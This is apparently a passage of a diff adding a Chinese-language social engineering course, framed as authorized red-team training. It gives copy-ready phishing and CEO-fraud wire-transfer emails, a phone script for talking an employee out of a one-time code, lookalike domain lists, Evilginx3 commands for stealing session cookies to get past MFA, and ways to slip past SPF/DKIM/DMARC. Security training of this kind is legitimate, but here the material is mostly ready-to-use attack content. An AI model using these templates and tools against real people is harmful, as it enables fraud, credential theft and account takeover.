+  <div class="il-item"><span class="il-num">06</span><div class="il-txt"><strong>媒體記者 / 研究人員</strong> — 假冒記者以採訪為名索取敏感信息。目標可能在未被告知什麼可以公開的情況下透露過多業務細節，甚至提供內部文件「佐證」。</div></div>
+</div>
+
+<div class="note warn">
+  <div class="note-lbl">演練中的邊界線</div>
+  <p>即使在授權的演練中，以下行為通常被禁止或需要額外授權：向員工施加造成心理創傷的壓力（如長時間恐嚇）、針對已知脆弱員工（新入職者、有已知壓力的員工）、涉及真實財務轉帳（即使是演練，也應在完成後立即通知財務部門）、收集超出演練目的的個人資料。始終在授權範圍內操作。</p>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">一個釣魚郵件的主旨是「【緊急】您的企業帳號將於今日 17:00 停用，請在截止時間前點擊連結完成驗證——所有部門員工已完成此步驟」。這個郵件同時利用了哪兩種 Cialdini 影響力原理？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>互惠（Reciprocity）+ 喜好（Liking）</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">B</span>承諾一致（Commitment）+ 權威（Authority）</div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">C</span>稀缺/緊迫（Scarcity）+ 社會認同（Social Proof）</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>喜好（Liking）+ 互惠（Reciprocity）</div>
+  </div>
+  <div class="q-exp">正確！「今日 17:00 停用」製造了時間壓力，觸發<strong>稀缺/緊迫</strong>原理，阻止目標仔細思考；「所有部門員工已完成此步驟」觸發<strong>社會認同</strong>原理，讓目標感到自己是唯一未完成的人，產生從眾壓力。這是最常見的釣魚郵件組合，研究表明同時使用兩種以上觸發機制可使點擊率提升 2-3 倍。</div>
+</div>
+</div>
+
+
+<!-- ===== CH2: 釣魚攻擊技術 ===== -->
+
+<!-- L2-1 釣魚郵件設計 -->
+<div class="cb" id="l2-1">
+<h2>釣魚郵件：設計與投遞技術</h2>
+<p>釣魚郵件（Phishing Email）是最廣泛使用的社工攻擊向量。一封有效的釣魚郵件需要在技術（繞過郵件過濾）和心理（觸發目標行動）兩個層面都達到高水準。</p>
+
+<h3>釣魚郵件解剖</h3>
+<div class="kg">
+  <div class="kt"><div class="kt-n">寄件人偽造（From Spoofing）</div><div class="kt-d">目標：讓郵件看起來來自可信源。技術手段：1. 使用同形字攻擊（rnicrosoft.com vs microsoft.com）; 2. 顯示名稱偽造（顯示「IT Support」但實際地址是 hacker@gmail.com）; 3. 合法域名的子域（support@mail.microsoft-security.com）。</div></div>
+  <div class="kt"><div class="kt-n">主旨行設計</div><div class="kt-d">關鍵詞觸發行動：緊急（URGENT）、安全（Security Alert）、行動（Action Required）、獨家（Your account）。A/B 測試不同主旨，使用 GoPhish 追蹤打開率。避免大量感嘆號和全大寫（觸發垃圾郵件過濾）。</div></div>
+  <div class="kt"><div class="kt-n">正文可信度</div><div class="kt-d">使用目標組織的真實 Logo 和品牌色彩（從官網直接引用 img src URL 更真實）；匹配目標的企業語氣；加入個人化信息（真實姓名、部門、職位）；避免語法錯誤（觸發懷疑）。</div></div>
+  <div class="kt"><div class="kt-n">行動號召（CTA）</div><div class="kt-d">釣魚鏈接設計：使用短網址（bit.ly）或合法域前置（CDN 重定向）隱藏真實 URL；或惡意附件（.docx 含宏、.pdf 含 JS、.zip 含 .lnk 或 .iso）；QR Code 釣魚（繞過部分郵件過濾）。</div></div>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">釣魚郵件模板結構（高效模式）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm">主旨：【安全通知】您的企業 Microsoft 365 帳號需要立即驗證</span>
+
+<span class="cm">─────────────────────────────────────</span>
+<span class="cm">[Microsoft Logo]</span>
+<span class="cm">─────────────────────────────────────</span>
+
+親愛的 {{FirstName}}，
+
+我們檢測到您的企業帳號（{{Email}}）近期有以下異常登入活動：
+
+  登入時間：{{CurrentDate}} 03:42 AM
+  地理位置：俄羅斯 莫斯科
+  裝置：未知 Windows 設備
+
+<span class="hl">為保護您的帳號安全，請在 24 小時內完成身份驗證，</span>
+<span class="hl">否則帳號將被暫停以防止未授權訪問。</span>
+
+                [ 立即驗證帳號 ]
+      https://account-verify.{{LegitLookingDomain}}.com
+
+<span class="cm">─────────────────────────────────────</span>
+如果此登入是您本人操作，請忽略此郵件。
+
+此致，
+Microsoft 帳戶安全團隊
+
+<span class="cm"># 結構分析：</span>
+<span class="cm"># 1. 個人化（{{FirstName}} {{Email}}）→ 降低警戒</span>
+<span class="cm"># 2. 具體威脅（真實時間+陌生地點）→ 製造恐懼</span>
+<span class="cm"># 3. 時間壓力（24小時內）→ 稀缺原理</span>
+<span class="cm"># 4. 退出選項（忽略）→ 降低防禦心理</span>
+<span class="cm"># 5. 權威簽名（Microsoft 安全團隊）→ 權威原理</span></pre>
+</div>
+</div>
+
+<!-- L2-2 魚叉式釣魚 -->
+<div class="cb" id="l2-2">
+<h2>魚叉式釣魚（Spear Phishing）</h2>
+<p>魚叉式釣魚（Spear Phishing）是針對特定個人或小型群體的高度客製化釣魚攻擊，區別於廣撒網的大規模釣魚。它需要更多前期 OSINT 準備，但成功率遠高於一般釣魚。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>類型</th><th>目標</th><th>特點</th><th>典型案例</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Spear Phishing</strong></td><td>特定個人（1-10人）</td><td>高度個人化，基於詳細 OSINT；成功率 50%+；需要大量準備時間</td><td>釣魚針對 CFO，使用其直屬上司的姓名和最近業務事件</td></tr>
+      <tr><td><strong>Whaling（捕鯨）</strong></td><td>高管（CEO/CFO/CTO）</td><td>最高價值目標；郵件格式更正式；後果最嚴重（BEC 詐騙、數據洩露）</td><td>假冒 CEO 要求 CFO 向「收購目標」匯款</td></tr>
+      <tr><td><strong>Clone Phishing</strong></td><td>已收到合法郵件的目標</td><td>克隆目標此前收到的真實郵件（快遞通知/會議邀請），替換鏈接或附件</td><td>克隆 DHL 快遞通知，替換追蹤鏈接為釣魚頁面</td></tr>
+      <tr><td><strong>Vishing（語音）</strong></td><td>電話通話目標</td><td>實時對話，可靈活應對；不受郵件過濾影響；結合 AI 聲音克隆技術效果更強</td><td>假冒銀行客服，誘使客戶提供 OTP</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">魚叉釣魚執行流程（針對財務人員）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 情景：針對財務部門的 BEC 攻擊（已授權演練）───</span>
+
+<span class="cm"># STEP 1：OSINT 準備（從 LinkedIn 獲取）</span>
+<span class="cm"># 目標：財務經理 李小明 (xm.li@targetcorp.com)</span>
+<span class="cm"># 上司：CFO 張偉 (w.zhang@targetcorp.com)（LinkedIn 顯示為其直屬上司）</span>
+<span class="cm"># 近期事件：公司 LinkedIn 頁面顯示「正在進行 Q3 收購談判」</span>
+<span class="cm"># 郵件格式：firstname.lastname → xm.li@targetcorp.com</span>
+
+<span class="cm"># STEP 2：設定欺騙性寄件人</span>
+<span class="cm"># 正式授權演練中可測試 SPF/DKIM 繞過</span>
+<span class="cm"># 或購買相似域名：targecorp.com（缺字母）、targetc0rp.com（數字 0）</span>
+
+<span class="cm"># STEP 3：魚叉釣魚郵件</span>
+<span class="cm">─────────────────────────────────</span>
+寄件人：張偉 &lt;w.zhang@targecorp.com&gt;   <span class="hl"># 注意：targecorp（少一個 t）</span>
+主旨：Re: Q3 收購項目——緊急付款確認
+
+小明，
+
+我現在在談判現場，手機信號不好。
+律師剛確認，需要在今天 EOD 之前完成
+首期款項 HKD 285,000 的轉帳，以鎖定
+交易。
+
+收款銀行：Hong Kong XXX Bank
+帳號：123-456-789-000
+收款人：Project Jade Holding Ltd.
+
+這個金額在你的授權範圍內，不需要再
+審批。請完成後回覆我確認，謝謝。
+
+張偉
+<span class="cm">─────────────────────────────────</span>
+<span class="cm"># 利用的心理機制：</span>
+<span class="cm"># - 權威（直接上司）</span>
+<span class="cm"># - 稀缺（今天 EOD）</span>
+<span class="cm"># - 借口規避（在你授權範圍內，無需再審批）</span>
+<span class="cm"># - 真實業務情境（Q3 收購項目）</span></pre>
+</div>
+</div>
+
+<!-- L2-3 GoPhish -->
+<div class="cb" id="l2-3">
+<h2>GoPhish 框架：自動化釣魚演練</h2>
+<p>GoPhish 是一個開源的釣魚演練平台，專為滲透測試人員和安全團隊設計，提供釣魚活動管理、郵件模板、追蹤分析等完整功能，是大規模組織釣魚演練的標準工具。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">GoPhish 部署與配置</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre"><span class="cm"># ─── 安裝 GoPhish ───</span>
+<span class="cm"># 下載最新版</span>
+wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
+unzip gophish-v0.12.1-linux-64bit.zip
+chmod +x gophish
+./gophish    <span class="cm"># 默認監聽 127.0.0.1:3333（管理界面）和 0.0.0.0:80（釣魚頁面）</span>
+
+<span class="cm"># 首次啟動輸出初始管理員密碼</span>
+<span class="cm"># 訪問 https://127.0.0.1:3333 → 使用 admin / [初始密碼]</span>
+
+<span class="cm"># ─── GoPhish 配置文件 config.json ───</span>
+{
+  "admin_server": {
+    "listen_url": "127.0.0.1:3333",
+    "use_tls": <span class="kw">true</span>,
+    "cert_path": "gophish_admin.crt",
+    "key_path": "gophish_admin.key"
+  },
+  "phish_server": {
+    "listen_url": "0.0.0.0:443",
+    "use_tls": <span class="kw">true</span>,         <span class="cm">// 使用 HTTPS 增加可信度</span>
+    "cert_path": "/etc/letsencrypt/live/phish.example.com/fullchain.pem",
+    "key_path": "/etc/letsencrypt/live/phish.example.com/privkey.pem"
+  },
+  "db_name": "sqlite3",
+  "db_path": "gophish.db"
+}
+
+<span class="cm"># ─── GoPhish 工作流程 ───</span>
+<span class="cm"># 1. 發件箱配置（Sending Profile）：</span>
+<span class="cm">#    - SMTP 服務器（自建或第三方：Mailgun / SendGrid / SES）</span>
+<span class="cm">#    - 寄件人顯示名稱和地址</span>
+<span class="cm">#    - 郵件頭部設定（Message-ID, Return-Path）</span>
+
+<span class="cm"># 2. 目標列表（Users &amp; Groups）：</span>
+<span class="cm">#    上傳 CSV 格式：first_name,last_name,email,position</span>
+<span class="cm">#    John,Doe,j.doe@targetcorp.com,Finance Manager</span>
+
+<span class="cm"># 3. 郵件模板（Email Templates）：</span>
+<span class="cm">#    支援 {{.FirstName}} {{.LastName}} {{.Email}} {{.TrackingURL}} 等變量</span>
+<span class="cm">#    HTML 模板 + 文字版本</span>
+
+<span class="cm"># 4. 釣魚頁面（Landing Pages）：</span>
+<span class="cm">#    可直接從真實網站導入（Import Site 功能）</span>
+<span class="cm">#    捕獲提交的憑證（Capture Credentials）</span>
+<span class="cm">#    提交後重定向到真實登入頁（降低懷疑）</span>
+
+<span class="cm"># 5. 活動啟動（Campaigns）：</span>
+<span class="cm">#    選擇模板 + 目標組 + 釣魚頁面 + 發件箱</span>
+<span class="cm">#    設定發送時間（分批發送避免被過濾）</span>
+<span class="cm">#    追蹤指標：Email Sent / Opened / Clicked / Submitted Data / Reported</span></pre>
+</div>
+</div>
+
+<!-- L2-4 釣魚頁面 -->
+<div class="cb" id="l2-4">
+<h2>釣魚頁面製作：Evilginx / GoPhish 落地頁</h2>
+<p>釣魚頁面（Landing Page / Phishing Page）是誘使目標輸入憑證的關鍵。現代釣魚頁面不僅要外觀逼真，還需要能繞過 MFA——這是 Evilginx 等中間人釣魚工具的核心能力。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>技術</th><th>原理</th><th>能否繞過 MFA</th><th>工具</th></tr></thead>
+    <tbody>
+      <tr><td><strong>靜態克隆頁面</strong></td><td>複製目標登入頁面的 HTML/CSS，捕獲用戶輸入的憑證</td><td>否（只能竊取密碼，無法處理 OTP）</td><td>GoPhish / HTTrack / wget</td></tr>
+      <tr><td><strong>反向代理釣魚</strong></td><td>作為中間人在用戶和真實服務器之間，實時轉發並捕獲所有請求（含 Session Cookie）</td><td>是（劫持完整驗證後的 Session Cookie）</td><td>Evilginx3 / Modlishka</td></tr>
+      <tr><td><strong>OAuth/SSO 釣魚</strong></td><td>偽造 OAuth 授權頁，誘使用戶授予攻擊者控制的應用訪問權限</td><td>是（獲得 OAuth 令牌，有效期長）</td><td>自建 OAuth App + GoPhish</td></tr>
+      <tr><td><strong>Browser-in-the-Browser</strong></td><td>在頁面內用 CSS/JS 模擬真實的瀏覽器彈窗（如 Google 登入視窗），URL 欄顯示合法地址</td><td>否（仍是偽造頁面）</td><td>BitB toolkit</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="note sec">
+  <div class="note-lbl">Evilginx3 — 核心優勢</div>
+  <p>Evilginx3 使用反向代理架構，讓目標直接與真實的 Microsoft / Google 服務器通訊，因此：（1）SSL 憑證是真實的（鎖頭圖示正常）；（2）真實的 MFA 流程正常完成；（3）Evilginx 在中間捕獲驗證後的 <strong>Session Cookie</strong>，攻擊者可直接用此 Cookie 繞過 MFA 訪問帳號。這就是為什麼即使啟用了 SMS OTP 或 TOTP，針對 Evilginx 攻擊也無法防禦——唯一有效防禦是 FIDO2 硬體金鑰（Origin 綁定，中間人無法重放）。</p>
+</div>
+</div>
+
+
+<!-- ===== CH3: 語音與實體社工 ===== -->
+
+<!-- L3-1 Vishing -->
+<div class="cb" id="l3-1">
+<h2>Vishing（語音釣魚）腳本設計</h2>
+<p>Vishing（Voice Phishing）通過電話進行社工攻擊。相比郵件，電話對話是實時的，需要即時應對目標反應，但也因此更有說服力——真人聲音比文字更難讓人拒絕。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Vishing 腳本範例（IT 技術支援借口）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre"><span class="cm">【場景】：假冒公司 IT 服務台，向員工索取 VPN 憑證進行「安全更新」</span>
+<span class="cm">【前置工作】：從 LinkedIn 確認目標姓名和部門；從官網找到 IT 服務台的真實電話號碼</span>
+<span class="cm">（以便目標「確認」時說「我們的號碼是 XXXX，這正是我們的號碼」）</span>
+
+<span class="cm">────────────────────────────────</span>
+攻擊者：「你好，請問是行政部的陳小姐嗎？我是 IT 服務台的阿明，
+         工號 T2047。我們的系統顯示您的電腦有一個緊急安全更新需要處理，
+         是關於 VPN 客戶端的漏洞補丁。」
+
+目標：「喔，是嗎？我現在電腦用起來是正常的。」
+
+攻擊者：「是的，這個漏洞是靜默的，用起來表面正常，但後台可能已經被
+         攻擊者入侵。我們公司昨天有兩台機器中招了。您方便讓我確認一下
+         您的帳號信息嗎？只需要幾分鐘。」
+
+目標：「好的，我的帳號是 cchen。」
+
+攻擊者：「好的，謝謝。現在我需要您配合我做個驗證：我會在系統後台重置
+         您的 VPN 密碼，新密碼會發到您手機。您收到後，請直接告訴我那個
+         6 位數字，這樣我才能確認您的賬號已經更新成功。」
+<span class="cm">────────────────────────────────</span>
+
+<span class="cm"># ─── Vishing 關鍵技術要點 ───</span>
+<span class="cm"># 1. 電話號碼欺騙（Caller ID Spoofing）</span>
+<span class="cm">#    使用 SIP 服務（如 SpoofCard / Twilio）偽造來電顯示為公司內線號碼</span>
+<span class="cm">#    工具：antispoofing.com, twilio.com（API 發起語音通話並設定發件人號碼）</span>
+
+<span class="cm"># 2. 說話節奏控制</span>
+<span class="cm">#    - 語速適中（過快顯得緊張）</span>
+<span class="cm">#    - 適當使用停頓製造自信感</span>
+<span class="cm">#    - 使用目標的名字（建立個人聯繫）</span>
+
+<span class="cm"># 3. 應對質疑的回應</span>
+<span class="cm">#    目標：「我能先確認一下你的工號嗎？」</span>
+<span class="cm">#    回應：「當然，我的工號是 T2047，您也可以撥打公司總機轉 IT 服務台確認，</span>
+<span class="cm">#            但如果要等轉接的話，您的帳號更新可能來不及在今天 5 點前完成。」</span>
+<span class="cm">#    （權威 + 稀缺：給予核實機會但同時製造時間壓力）</span></pre>
+</div>
+</div>
+
+<!-- L3-2 實體滲透 -->
+<div class="cb" id="l3-2">
+<h2>尾隨進入（Tailgating）與實體滲透</h2>
+<p>實體社工（Physical Social Engineering）攻擊的是物理安全控制，包括門禁系統、訪客登記程序和員工安全意識。尾隨進入（Tailgating）是最常見的實體攻擊手段，成功率驚人地高。</p>
+
+<div class="ilist">
+  <div class="il-item"><span class="il-num">01</span><div class="il-txt"><strong>尾隨進入（Tailgating / Piggybacking）</strong> — 緊跟已刷卡進入的員工進入門禁區域，不使用自己的憑證。研究顯示，超過 70% 的員工會為「看起來友善」的陌生人開門。常見偽裝：雙手提著文件箱（顯得騰不出手刷卡）、穿工程師背心或送餐員制服。</div></div>
+  <div class="il-item"><span class="il-num">02</span><div class="il-txt"><strong>偽造訪客身份</strong> — 以外部人員身份（IT 設備維修、辦公室植物護理、快遞員）進入。前台可能不嚴格驗證預約，尤其當聲稱是「緊急維修」或「設備保養」時。準備看起來專業的工具包和名片。</div></div>
+  <div class="il-item"><span class="il-num">03</span><div class="il-txt"><strong>肩窺（Shoulder Surfing）</strong> — 在公共區域（咖啡廳、機場、開放辦公室）偷看目標輸入密碼或查看機密屏幕。高倍率攝影鏡頭可以在更遠距離進行。實體紅隊演練中需明確記錄此類機密數據暴露情況。</div></div>
+  <div class="il-item"><span class="il-num">04</span><div class="il-txt"><strong>桌面信息收集（Dumpster Diving / Desk Inspection）</strong> — 在無人看管時快速拍攝桌上的便條紙（常記有密碼）、組織圖、印出的文件。翻查垃圾桶（Dumpster Diving）可找到含敏感信息的廢棄文件。</div></div>
+  <div class="il-item"><span class="il-num">05</span><div class="il-txt"><strong>RFID 複製</strong> — 使用 Proxmark3 等工具在近距離（30cm 內）讀取目標的門禁卡並複製，製作一張功能相同的卡。低頻 125kHz 卡（常見舊款門禁）可輕鬆複製；13.56MHz MIFARE 的加密變體更難但仍有已知漏洞。</div></div>
+</div>
+</div>
+
+<!-- L3-3 USB 丟棄 -->
+<div class="cb" id="l3-3">
+<h2>USB 丟棄攻擊與惡意設備</h2>
+<p>USB 丟棄（USB Drop）攻擊利用人類的好奇心——在停車場或辦公大廳故意遺留標有吸引標籤（如「薪資表 2024」「CEO 私人文件」）的 USB 隨身碟。研究顯示，約 45% 的人會插入撿到的 USB。</p>
+
+<div class="kg">
+  <div class="kt"><div class="kt-n">普通 USB + AutoRun</div><div class="kt-d">早期技術，依賴 Windows AutoRun 功能自動執行。Windows 7+ 默認禁用 AutoRun，但仍可用於誘使用戶手動點擊惡意文件（.lnk 偽裝成文件夾）。現代防毒軟件通常可偵測。</div></div>
+  <div class="kt"><div class="kt-n">USB Rubber Ducky</div><div class="kt-d">偽裝成普通 USB 隨身碟的 HID（鍵盤）設備，插入後自動模擬鍵盤輸入，在幾秒內執行預設腳本（開啟 PowerShell、下載並執行 Payload、新增用戶帳號）。速度極快，人眼難以察覺。</div></div>
+  <div class="kt"><div class="kt-n">O.MG Cable</div><div class="kt-d">偽裝成普通 USB 充電線的攻擊設備，內置 WiFi 模組和鍵盤模擬器。攻擊者可遠端通過 WiFi 向連接的電腦發送惡意鍵盤輸入，或在特定條件下觸發攻擊。視覺上與正常充電線完全相同。</div></div>
+  <div class="kt"><div class="kt-n">Bash Bunny</div><div class="kt-d">多模式攻擊設備（可切換 HID/Ethernet/Mass Storage）。可執行複雜的後滲透腳本：自動轉儲 Windows 憑證（QuickCreds 模組）、安裝持久化後門、導出瀏覽器存儲的密碼。</div></div>
+</div>
+</div>
+
+<!-- L3-4 Deepfake / AI 社工 -->
+<div class="cb" id="l3-4">
+<h2>深偽技術（Deepfake）與 AI 社工</h2>
+<p>AI 技術的發展正在革命性地改變社工攻擊的能力。語音克隆、視頻深偽和 AI 生成釣魚郵件大幅降低了高度可信攻擊的門檻。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>AI 技術</th><th>攻擊應用</th><th>真實案例</th><th>防禦難點</th></tr></thead>
+    <tbody>
+      <tr><td><strong>語音克隆（Voice Cloning）</strong></td><td>僅需 3-10 秒語音樣本（來自 YouTube / LinkedIn 視頻）即可克隆 CEO 聲音，用於 Vishing；工具：ElevenLabs、RVC</td><td>2020 年，UAE 銀行行長聲音被克隆，誘使分行匯款 3500 萬美元</td><td>電話語音無法可靠驗證身份；「緊急情況」使人跳過驗證</td></tr>
+      <tr><td><strong>AI 釣魚郵件生成</strong></td><td>使用 LLM 自動生成個人化、無語法錯誤的釣魚郵件；可根據目標 LinkedIn 資料自動客製化</td><td>WormGPT、FraudGPT 等無審查 LLM 在暗網出售</td><td>AI 生成郵件比人工撰寫更難通過文風識別</td></tr>
+      <tr><td><strong>視頻深偽（Video Deepfake）</strong></td><td>在視頻通話中實時替換臉部，假冒高管進行視頻會議指令；工具：DeepFaceLive、FaceFusion</td><td>2024 年，香港跨國公司員工在視頻會議被 Deepfake CFO 欺騙，匯款 2 億港元</td><td>視頻通話的真實感大幅降低員工警覺性</td></tr>
+      <tr><td><strong>AI 個人化釣魚（Spear Phishing at Scale）</strong></td><td>將 LLM 與 OSINT 工具結合，自動為大量目標生成高度個人化的魚叉釣魚郵件，規模化精準攻擊</td><td>研究顯示 AI 生成的個人化釣魚郵件點擊率比通用模板高 40%</td><td>傳統基於規則的過濾無法識別高品質 AI 生成內容</td></tr>
+    </tbody>
+  </table>
+</div>
+</div>
+
+
+<!-- ===== CH4: 釣魚基礎設施 ===== -->
+
+<!-- L4-1 域名策略 -->
+<div class="cb" id="l4-1">
+<h2>域名策略：釣魚域選購與配置</h2>
+<p>釣魚基礎設施（Phishing Infrastructure）的設計決定了攻擊的成功率和持久性。域名選擇是第一步，也是整個釣魚行動的基礎。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">釣魚域名類型與選購策略</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 釣魚域名技術（視覺混淆）───</span>
+
+<span class="cm"># 1. Typosquatting（拼寫錯誤）</span>
+<span class="cm"># 目標：microsoft.com</span>
+microsofy.com          <span class="cm"># 末尾字母替換</span>
+micros0ft.com          <span class="cm"># 數字替換字母</span>
+micosoft.com           <span class="cm"># 缺少字母</span>
+microsoftt.com         <span class="cm"># 重複字母</span>
+
+<span class="cm"># 2. 同形字攻擊（Homograph / IDN Homograph）</span>
+<span class="cm"># 使用 Unicode 字符替換拉丁字母，視覺上幾乎相同</span>
+mіcrosoft.com          <span class="cm"># i → 西里爾文 і（U+0456）</span>
+rnicrosoft.com         <span class="cm"># m → rn（兩個字母組合）</span>
+
+<span class="cm"># 3. 添加關鍵詞（Combosquatting）</span>
+microsoft-secure.com
+microsoft-login.net
+login-microsoft.com
+microsoft-support.co
+
+<span class="cm"># 4. 相似 TLD</span>
+microsoft.co           <span class="cm"># .co 替代 .com</span>
+microsoft.com.cn       <span class="cm"># 添加地區後綴</span>
+
+<span class="cm"># ─── 域名信譽預熱（Aged Domain / Warm-up）───</span>
+<span class="cm"># 全新域名的郵件更易被標記為垃圾郵件</span>
+<span class="cm"># 策略1：購買已有一定年齡（1-2年）的已過期域名</span>
+<span class="cm"># 查詢工具：expireddomains.net、SpamHaus Checker</span>
+
+<span class="cm"># 策略2：預熱新域名（在釣魚演練前 2-4 週）：</span>
+<span class="cm"># - 設置 DNS MX 記錄、SPF/DKIM/DMARC</span>
+<span class="cm"># - 從此域名發送少量非釣魚郵件（新聞通訊、測試郵件）</span>
+<span class="cm"># - 建立一個看起來合法的網站</span>
+
+<span class="cm"># ─── 釣魚域名基礎 DNS 配置 ───</span>
+<span class="cm"># 在 Cloudflare / Route53 配置以下 DNS 記錄：</span>
+<span class="cm"># A 記錄：phish.example.com → [VPS IP]（GoPhish 或 Evilginx 服務器）</span>
+<span class="cm"># MX 記錄：example.com → mail.example.com（自建郵件服務器）</span>
+<span class="cm"># TXT 記錄（SPF）：v=spf1 ip4:[VPS IP] -all</span>
+<span class="cm"># TXT 記錄（DMARC）：v=DMARC1; p=none; rua=mailto:dmarc@example.com</span>
+<span class="cm"># CNAME（DKIM）：mail._domainkey → [DKIM 公鑰記錄]</span>
+<span class="cm"># SSL 憑證（Let's Encrypt）：</span>
+certbot certonly --standalone -d phish.example.com --agree-tos -m admin@example.com</pre>
+</div>
+</div>
+
+<!-- L4-2 Evilginx3 -->
+<div class="cb" id="l4-2">
+<h2>Evilginx3：中間人反向代理釣魚</h2>
+<p>Evilginx3 是目前最強大的釣魚框架，通過反向代理中間人架構，可以在不修改目標網站的情況下劫持完整的認證流程，即使目標啟用了 MFA。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Evilginx3 安裝與基本使用</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── Evilginx3 安裝（需要域名 + VPS）───</span>
+<span class="cm"># 系統要求：Ubuntu 20.04+，80/443 端口開放，有公開 IP 的 VPS</span>
+
+go install github.com/kgretzky/evilginx3@latest
+
+<span class="cm"># 準備：DNS 設定</span>
+<span class="cm"># phish.example.com A → [VPS IP]</span>
+<span class="cm"># *.phish.example.com A → [VPS IP]（子域通配符，用於各服務）</span>
+
+<span class="cm"># ─── 啟動 Evilginx3 ───</span>
+./evilginx3 -p phishlets/ -t redirectors/
+
+<span class="cm"># ─── 基本配置命令 ───</span>
+: config domain phish.example.com   <span class="cm"># 設定主域名</span>
+: config ipv4 external [VPS IP]     <span class="cm"># 設定公開 IP</span>
+
+<span class="cm"># ─── 啟用 Phishlet（釣魚配置文件）───</span>
+<span class="cm"># Phishlet 定義了如何代理特定服務（Microsoft365、Google、LinkedIn 等）</span>
+: phishlets                          <span class="cm"># 列出所有可用 phishlet</span>
+: phishlets hostname o365 login.phish.example.com  <span class="cm"># 設定 O365 釣魚域名</span>
+: phishlets enable o365              <span class="cm"># 啟用並自動申請 SSL 憑證</span>
+
+<span class="cm"># ─── 創建釣魚活動 Lure ───</span>
+: lures create o365                  <span class="cm"># 創建 O365 釣魚鏈接</span>
+: lures get-url 0                    <span class="cm"># 獲取釣魚 URL（用於釣魚郵件中）</span>
+<span class="cm"># 輸出：https://login.phish.example.com/AbCdEfGh</span>
+
+<span class="cm"># ─── 查看捕獲的 Session ───</span>
+: sessions                           <span class="cm"># 列出所有捕獲的 Session</span>
+: sessions 1                         <span class="cm"># 查看詳細信息</span>
+<span class="cm"># 輸出包含：用戶名、密碼、捕獲的 Session Cookie（JSON 格式）</span>
+
+<span class="cm"># ─── 使用捕獲的 Cookie 繞過 MFA 登入 ───</span>
+<span class="cm"># 方法1：瀏覽器 EditThisCookie 插件，直接導入 JSON Cookie</span>
+<span class="cm"># 方法2：使用 Cookie-Editor 瀏覽器擴展</span>
+<span class="cm"># 方法3：Playwright / Puppeteer 腳本自動化導入</span></pre>
+</div>
+</div>
+
+<!-- L4-3 繞過郵件驗證 -->
+<div class="cb" id="l4-3">
+<h2>釣魚郵件繞過 SPF / DKIM / DMARC</h2>
+<p>現代郵件安全系統通過 SPF、DKIM、DMARC 三重機制驗證發件人身份。理解這些機制及其繞過方法，是確保釣魚郵件能夠送達目標收件箱的關鍵。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>機制</th><th>驗證內容</th><th>常見弱點</th><th>繞過策略</th></tr></thead>
+    <tbody>
+      <tr><td><strong>SPF</strong></td><td>發件 IP 是否在域名授權的 IP 列表中（DNS TXT 記錄）</td><td>許多組織使用 <code>~all</code>（軟失敗）而非 <code>-all</code>（硬拒絕）；Forwarding 場景下 SPF 必然失敗</td><td>使用自有域名正確配置 SPF；利用 Open Relay 轉發；購買 SPF 配置鬆散的域名</td></tr>
+      <tr><td><strong>DKIM</strong></td><td>郵件內容的數字簽名，使用域名私鑰簽名；接收方用 DNS 公鑰驗證</td><td>舊版 DKIM 使用 512/1024-bit 密鑰（已可被破解）；DKIM 只驗證 Header-From，Body-From 可不同</td><td>對自有域名設定 DKIM；利用第三方 ESP（Mailgun/SES）的 DKIM；DKIM Replay Attack</td></tr>
+      <tr><td><strong>DMARC</strong></td><td>SPF 或 DKIM 是否與 From 域名對齊；定義驗證失敗後的處理策略（none/quarantine/reject）</td><td>大量域名使用 <code>p=none</code>（僅報告，不攔截）；DMARC 子域名策略（sp=）常被忽略</td><td>針對 p=none 的域名直接發送；使用相似域名繞過 DMARC 對齊</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">郵件安全配置驗證工具</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 查詢目標域名的 SPF / DKIM / DMARC 配置 ───</span>
+<span class="cm"># 了解目標的配置弱點，決定攻擊策略</span>
+
+<span class="cm"># SPF 查詢</span>
+nslookup -type=TXT targetcorp.com | grep spf
+<span class="cm"># 結果示例：v=spf1 include:spf.protection.outlook.com ~all</span>
+<span class="cm"># ~all = 軟失敗（很多郵件服務器仍會投遞，只是標記）</span>
+<span class="cm"># -all = 硬失敗（嚴格拒絕）</span>
+
+<span class="cm"># DMARC 查詢</span>
+nslookup -type=TXT _dmarc.targetcorp.com
+<span class="cm"># 結果示例：v=DMARC1; p=none; rua=mailto:dmarc@targetcorp.com</span>
+<span class="cm"># p=none = 只報告，不攔截（直接發送即可）</span>
+
+<span class="cm"># DKIM 選擇器查詢（需要知道選擇器名稱，常見：mail / google / s1 / s2）</span>
+nslookup -type=TXT mail._domainkey.targetcorp.com
+
+<span class="cm"># ─── 線上工具（更快速）───</span>
+<span class="cm"># MXToolbox: https://mxtoolbox.com/SuperTool.aspx</span>
